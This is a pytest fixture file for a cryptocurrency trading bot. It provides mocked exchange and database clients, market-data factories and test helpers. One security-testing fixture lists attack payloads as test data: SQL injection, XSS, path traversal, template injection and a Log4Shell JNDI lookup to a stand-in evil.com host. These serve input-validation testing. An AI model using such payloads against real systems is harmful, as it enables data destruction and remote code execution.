"""
Pytest configuration and shared fixtures for the n0name trading bot test suite.

This module provides:
- Common fixtures for testing
- Mock objects for external dependencies
- Test utilities and helpers
- Database and API mocking setup
"""

import asyncio
import pytest
import pandas as pd
import numpy as np
from datetime import datetime, timedelta
from decimal import Decimal
from typing import Dict, Any, List, Optional
from unittest.mock import Mock, AsyncMock, MagicMock, patch
import tempfile
import os
from pathlib import Path

# Test data and factories
import factory
from faker import Faker

# Import project modules for testing
from src.n0name.core.trading_engine import TradingEngine, TradingConfig
from src.n0name.core.position_manager import PositionManager, PositionConfig, Position
from src.n0name.core.order_manager import OrderManager, OrderConfig
from src.n0name.core.base_strategy import BaseStrategy, MarketData, TradingSignal, SignalType, PositionSide
from src.n0name.config.models import TradingConfig as ConfigTradingConfig
from src.n0name.exceptions import TradingBotException, NetworkException, APIException

fake = Faker()


# ============================================================================
# Event Loop and Async Fixtures
# ============================================================================

@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


# ============================================================================
# Configuration Fixtures
# ============================================================================

@pytest.fixture
def trading_config():
    """Create a test trading configuration."""
    return TradingConfig(
        max_open_positions=3,
        leverage=10,
        lookback_period=100,
        position_value_percentage=0.2,
        enable_database_logging=False,
        enable_notifications=False
    )


@pytest.fixture
def position_config():
    """Create a test position configuration."""
    return PositionConfig(
        tp_percentage_long=0.01,
        sl_percentage_long=0.005,
        hard_sl_percentage_long=0.015,
        tp_percentage_short=0.01,
        sl_percentage_short=0.005,
        hard_sl_percentage_short=0.015
    )


@pytest.fixture
def order_config():
    """Create a test order configuration."""
    return OrderConfig(
        max_retries=2,
        retry_delay=0.1,
        validate_funding_fee=False,
        min_order_value=5.0
    )


# ============================================================================
# Mock External Dependencies
# ============================================================================

@pytest.fixture
def mock_binance_client():
    """Create a mock Binance client."""
    client = AsyncMock()
    
    # Mock common methods
    client.get_account = AsyncMock(return_value={
        'balances': [
            {'asset': 'USDT', 'free': '1000.0', 'locked': '0.0'}
        ]
    })
    
    client.get_symbol_info = AsyncMock(return_value={
        'symbol': 'BTCUSDT',
        'status': 'TRADING',
        'baseAsset': 'BTC',
        'quoteAsset': 'USDT',
        'filters': [
            {'filterType': 'LOT_SIZE', 'stepSize': '0.00001000'},
            {'filterType': 'PRICE_FILTER', 'tickSize': '0.01000000'}
        ]
    })
    
    client.get_klines = AsyncMock(return_value=[
        [1640995200000, '47000.0', '47500.0', '46800.0', '47200.0', '100.0']
        for _ in range(100)
    ])
    
    client.create_order = AsyncMock(return_value={
        'orderId': 12345,
        'symbol': 'BTCUSDT',
        'status': 'FILLED',
        'executedQty': '0.001',
        'cummulativeQuoteQty': '47.2'
    })
    
    client.get_position_risk = AsyncMock(return_value=[])
    client.ping = AsyncMock(return_value={})
    
    return client


@pytest.fixture
def mock_logger():
    """Create a mock logger."""
    logger = Mock()
    logger.info = Mock()
    logger.warning = Mock()
    logger.error = Mock()
    logger.debug = Mock()
    return logger


@pytest.fixture
def mock_database():
    """Create a mock database connection."""
    db = AsyncMock()
    db.execute = AsyncMock()
    db.fetch = AsyncMock(return_value=[])
    db.fetchrow = AsyncMock(return_value=None)
    return db


# ============================================================================
# Test Data Factories
# ============================================================================

class MarketDataFactory(factory.Factory):
    """Factory for creating test market data."""
    
    class Meta:
        model = MarketData
    
    @factory.lazy_attribute
    def df(self):
        """Generate test DataFrame with OHLCV data."""
        dates = pd.date_range(
            start=datetime.now() - timedelta(days=100),
            periods=100,
            freq='1H'
        )
        
        # Generate realistic price data
        base_price = 47000.0
        prices = []
        current_price = base_price
        
        for _ in range(100):
            # Random walk with some volatility
            change = np.random.normal(0, 0.02) * current_price
            current_price = max(current_price + change, base_price * 0.8)
            prices.append(current_price)
        
        df = pd.DataFrame({
            'timestamp': dates,
            'open': prices,
            'high': [p * (1 + abs(np.random.normal(0, 0.01))) for p in prices],
            'low': [p * (1 - abs(np.random.normal(0, 0.01))) for p in prices],
            'close': prices,
            'volume': [np.random.uniform(50, 200) for _ in range(100)]
        })
        
        return df
    
    close_price = factory.LazyAttribute(lambda obj: obj.df['close'].iloc[-1])
    symbol = factory.Faker('random_element', elements=['BTCUSDT', 'ETHUSDT', 'ADAUSDT'])


@pytest.fixture
def sample_market_data():
    """Create sample market data for testing."""
    return MarketDataFactory()


class TradingSignalFactory(factory.Factory):
    """Factory for creating test trading signals."""
    
    class Meta:
        model = TradingSignal
    
    signal_type = factory.Faker('random_element', elements=[SignalType.BUY, SignalType.SELL, SignalType.HOLD])
    strength = factory.Faker('pyfloat', min_value=0.0, max_value=1.0)
    confidence = factory.Faker('pyfloat', min_value=0.5, max_value=1.0)
    conditions = factory.LazyAttribute(lambda obj: {
        'condition_1': True,
        'condition_2': obj.signal_type != SignalType.HOLD,
        'condition_3': obj.strength > 0.5
    })
    metadata = factory.LazyAttribute(lambda obj: {
        'timestamp': datetime.now().isoformat(),
        'strategy': 'test_strategy',
        'indicators': {'rsi': 65.0, 'macd': 0.5}
    })


@pytest.fixture
def sample_trading_signal():
    """Create a sample trading signal for testing."""
    return TradingSignalFactory()


class PositionFactory(factory.Factory):
    """Factory for creating test positions."""
    
    class Meta:
        model = Position
    
    symbol = factory.Faker('random_element', elements=['BTCUSDT', 'ETHUSDT', 'ADAUSDT'])
    side = factory.Faker('random_element', elements=[PositionSide.LONG, PositionSide.SHORT])
    quantity = factory.Faker('pyfloat', min_value=0.001, max_value=1.0)
    entry_price = factory.Faker('pyfloat', min_value=1000.0, max_value=50000.0)
    current_price = factory.LazyAttribute(lambda obj: obj.entry_price * (1 + np.random.normal(0, 0.05)))


@pytest.fixture
def sample_position():
    """Create a sample position for testing."""
    return PositionFactory()


# ============================================================================
# Mock Strategy for Testing
# ============================================================================

class MockStrategy(BaseStrategy):
    """Mock strategy for testing purposes."""
    
    def __init__(self, name: str = "MockStrategy", parameters: Dict[str, Any] = None):
        super().__init__(name, parameters)
        self.buy_signal_result = TradingSignalFactory(signal_type=SignalType.HOLD)
        self.sell_signal_result = TradingSignalFactory(signal_type=SignalType.HOLD)
    
    def check_buy_conditions(self, market_data: MarketData, symbol: str, logger) -> TradingSignal:
        """Return configured buy signal."""
        return self.buy_signal_result
    
    def check_sell_conditions(self, market_data: MarketData, symbol: str, logger) -> TradingSignal:
        """Return configured sell signal."""
        return self.sell_signal_result
    
    def validate_market_data(self, market_data: MarketData) -> bool:
        """Always return True for testing."""
        return True
    
    def get_strategy_info(self) -> Dict[str, Any]:
        """Return strategy information."""
        return {
            'name': self.name,
            'parameters': self.parameters,
            'type': 'mock'
        }


@pytest.fixture
def mock_strategy():
    """Create a mock strategy for testing."""
    return MockStrategy()


# ============================================================================
# Component Fixtures
# ============================================================================

@pytest.fixture
def position_manager(position_config):
    """Create a position manager for testing."""
    return PositionManager(position_config)


@pytest.fixture
def order_manager(order_config):
    """Create an order manager for testing."""
    return OrderManager(order_config)


@pytest.fixture
def trading_engine(mock_strategy, trading_config, position_config, order_config):
    """Create a trading engine for testing."""
    return TradingEngine(
        strategy=mock_strategy,
        trading_config=trading_config,
        position_config=position_config,
        order_config=order_config
    )


# ============================================================================
# File System and Temporary Resources
# ============================================================================

@pytest.fixture
def temp_dir():
    """Create a temporary directory for testing."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


@pytest.fixture
def temp_config_file(temp_dir):
    """Create a temporary configuration file."""
    config_content = """
trading:
  max_open_positions: 5
  leverage: 10
  lookback_period: 500
  position_value_percentage: 0.2

database:
  host: localhost
  port: 5432
  name: test_db

security:
  encryption_key: test_key
  api_timeout: 30
"""
    config_file = temp_dir / "test_config.yml"
    config_file.write_text(config_content)
    return config_file


# ============================================================================
# Network and API Mocking
# ============================================================================

@pytest.fixture
def mock_http_responses():
    """Setup mock HTTP responses for external API calls."""
    with patch('aiohttp.ClientSession') as mock_session:
        mock_response = AsyncMock()
        mock_response.status = 200
        mock_response.json = AsyncMock(return_value={'status': 'success'})
        mock_response.text = AsyncMock(return_value='{"status": "success"}')
        
        mock_session.return_value.__aenter__.return_value.get.return_value.__aenter__.return_value = mock_response
        mock_session.return_value.__aenter__.return_value.post.return_value.__aenter__.return_value = mock_response
        
        yield mock_session


# ============================================================================
# Database Fixtures
# ============================================================================

@pytest.fixture
def mock_influxdb():
    """Create a mock InfluxDB client."""
    client = Mock()
    client.write_points = Mock(return_value=True)
    client.query = Mock(return_value=[])
    return client


# ============================================================================
# Performance Testing Fixtures
# ============================================================================

@pytest.fixture
def performance_data():
    """Generate performance test data."""
    return {
        'symbols': ['BTCUSDT', 'ETHUSDT', 'ADAUSDT', 'BNBUSDT', 'XRPUSDT'],
        'iterations': 1000,
        'concurrent_requests': 10,
        'data_size': 10000
    }


# ============================================================================
# Security Testing Fixtures
# ============================================================================

@pytest.fixture
def security_test_data():
    """Generate security test data."""
    return {
        'malicious_inputs': [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}"
        ],
        'invalid_tokens': [
            "invalid_token",
            "expired_token",
            "",
            None,
            "malformed.jwt.token"
        ]
    }


# ============================================================================
# Test Utilities
# ============================================================================

class TestUtils:
    """Utility class for common test operations."""
    
    @staticmethod
    def assert_signal_valid(signal: TradingSignal):
        """Assert that a trading signal is valid."""
        assert isinstance(signal, TradingSignal)
        assert signal.signal_type in [SignalType.BUY, SignalType.SELL, SignalType.HOLD]
        assert 0.0 <= signal.strength <= 1.0
        assert 0.0 <= signal.confidence <= 1.0
        assert isinstance(signal.conditions, dict)
    
    @staticmethod
    def assert_position_valid(position: Position):
        """Assert that a position is valid."""
        assert isinstance(position, Position)
        assert position.symbol
        assert position.side in [PositionSide.LONG, PositionSide.SHORT]
        assert position.quantity > 0
        assert position.entry_price > 0
    
    @staticmethod
    def create_mock_kline_data(symbol: str, count: int = 100) -> List[List]:
        """Create mock kline data for testing."""
        base_time = int(datetime.now().timestamp() * 1000)
        base_price = 47000.0
        
        klines = []
        for i in range(count):
            timestamp = base_time + (i * 60000)  # 1 minute intervals
            price = base_price + (i * 10)  # Gradual price increase
            
            klines.append([
                timestamp,
                str(price),  # open
                str(price + 50),  # high
                str(price - 30),  # low
                str(price + 20),  # close
                "100.0",  # volume
                timestamp + 59999,  # close time
                "4700000.0",  # quote asset volume
                100,  # number of trades
                "50.0",  # taker buy base asset volume
                "2350000.0",  # taker buy quote asset volume
                "0"  # ignore
            ])
        
        return klines


@pytest.fixture
def test_utils():
    """Provide test utilities."""
    return TestUtils


# ============================================================================
# Cleanup Fixtures
# ============================================================================

@pytest.fixture(autouse=True)
def cleanup_globals():
    """Clean up global state after each test."""
    yield
    # Reset any global variables or state here
    # This ensures tests don't interfere with each other


# ============================================================================
# Markers and Test Categories
# ============================================================================

def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line(
        "markers", "unit: mark test as a unit test"
    )
    config.addinivalue_line(
        "markers", "integration: mark test as an integration test"
    )
    config.addinivalue_line(
        "markers", "slow: mark test as slow running"
    )
    config.addinivalue_line(
        "markers", "api: mark test as requiring API access"
    )
    config.addinivalue_line(
        "markers", "database: mark test as requiring database access"
    )


def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers based on test names."""
    for item in items:
        # Add unit marker to unit tests
        if "unit" in item.nodeid:
            item.add_marker(pytest.mark.unit)
        
        # Add integration marker to integration tests
        if "integration" in item.nodeid:
            item.add_marker(pytest.mark.integration)
        
        # Add slow marker to performance tests
        if "performance" in item.nodeid or "benchmark" in item.nodeid:
            item.add_marker(pytest.mark.slow) 